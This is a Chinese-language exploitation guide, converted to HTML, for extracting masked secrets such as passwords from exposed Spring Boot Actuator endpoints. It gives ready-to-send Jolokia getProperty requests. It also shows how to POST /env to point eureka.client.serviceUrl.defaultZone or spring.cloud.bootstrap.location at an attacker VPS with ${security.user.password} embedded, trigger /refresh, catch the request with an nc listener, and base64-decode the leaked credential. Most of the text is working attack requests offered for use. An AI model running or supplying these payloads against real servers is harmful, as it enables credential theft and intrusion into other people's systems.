<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h2>获取被星号脱敏的密码的明文 (方法一)</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p><h4><em>利用条件：</em></h4><ul><li>目标网站存在 /jolokia 或 /actuator/jolokia 接口</li><li>目标使用了 jolokia-core 依赖（版本要求暂未知）<br /><strong><em>利用方法：</em></strong><br /><strong>步骤一： 找到想要获取的属性名</strong><br />GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。<br /><strong>步骤二： jolokia 调用相关 Mbean 获取明文</strong><br />将下面示例中的 security.user.password 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 value 键中。</li><li>调用 org.springframework.boot Mbean（<strong>可能更通用</strong>）<br />实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法<br />spring 1.x<br />POST /jolokia<br />Content-Type: application/json<br /><br />{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}<br />spring 2.x<br />POST /actuator/jolokia<br />Content-Type: application/json<br /><br />{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}</li><li>调用 org.springframework.cloud.context.environment Mbean（<strong>需要 spring cloud 相关依赖</strong>）<br />实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法<br />spring 1.x<br />POST /jolokia<br />Content-Type: application/json<br /><br />{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}<br />spring 2.x<br />POST /actuator/jolokia<br />Content-Type: application/json<br /><br />{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}<br /><strong>获取被星号脱敏的密码的明文 (方法二)</strong><br />访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果<br /><strong><em>利用条件：</em></strong></li><li>可以 GET 请求目标网站的 /env</li><li>可以 POST 请求目标网站的 /env</li><li>可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）</li><li>目标使用了 spring-cloud-starter-netflix-eureka-client 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）<br /><strong><em>利用方法：</em></strong><br /><strong>步骤一： 找到想要获取的属性名</strong><br />GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。<br /><strong>步骤二： 使用 nc 监听 HTTP 请求</strong><br />在自己控制的外网服务器上监听 80 端口：<br />nc -lvk 80<br /><strong>步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</strong><br />将下面 http://value:${security.user.password}@your-vps-ip 中的 security.user.password 换成自己想要获取的对应的星号 * 遮掩的属性名；<br />your-vps-ip 换成自己外网服务器的真实 ip 地址。<br />spring 1.x<br />POST /env<br />Content-Type: application/x-www-form-urlencoded<br /><br />eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip<br />spring 2.x<br />POST /actuator/env<br />Content-Type: application/json<br /><br />{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}<br /><strong>步骤四： 刷新配置</strong><br />spring 1.x<br />POST /refresh<br />Content-Type: application/x-www-form-urlencoded<br />spring 2.x<br />POST /actuator/refresh<br />Content-Type: application/json<br /><strong>步骤五： 解码属性值</strong><br />正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 Authorization 头内容：<br />Authorization: Basic dmFsdWU6MTIzNDU2<br />将其中的 dmFsdWU6MTIzNDU2部分使用 base64 解码，即可获得类似明文值 value:123456，其中的 123456 即是目标星号 * 脱敏前的属性值明文。<br /><strong>获取被星号脱敏的密码的明文 (方法三)</strong><br />访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果<br /><strong><em>利用条件：</em></strong></li><li>通过 POST /env 设置属性触发目标对外网指定地址发起任意 http 请求</li><li>目标可以请求攻击者的服务器（请求可出外网）<br /><strong><em>利用方法：</em></strong><br />参考 UUUUnotfound 提出的 <a href="https://github.com/LandGrey/SpringBootVulExploit/issues/1">issue-1</a>，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据<br /><strong>步骤一： 找到想要获取的属性名</strong><br />GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。<br /><strong>步骤二： 使用 nc 监听 HTTP 请求</strong><br />在自己控制的外网服务器上监听 80 端口：<br />nc -lvk 80<br /><strong>步骤三： 触发对外 http 请求</strong></li><li>spring.cloud.bootstrap.location 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）：<br />spring 1.x<br />POST /env<br />Content-Type: application/x-www-form-urlencoded<br /><br />spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}<br />spring 2.x<br />POST /actuator/env<br />Content-Type: application/json<br /><br />{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=${security.user.password}"}</li><li>eureka.client.serviceUrl.defaultZone 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）：</li></ul><p>spring 1.x</p><p>POST /env<br />Content-Type: application/x-www-form-urlencoded<br /><br />eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}</p><p>spring 2.x</p><p>POST /actuator/env<br />Content-Type: application/json<br /><br />{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}</p><h5>步骤四： 刷新配置</h5><p>spring 1.x</p><p>POST /refresh<br />Content-Type: application/x-www-form-urlencoded</p><p>spring 2.x</p><p>POST /actuator/refresh<br />Content-Type: application/json</p></body></html>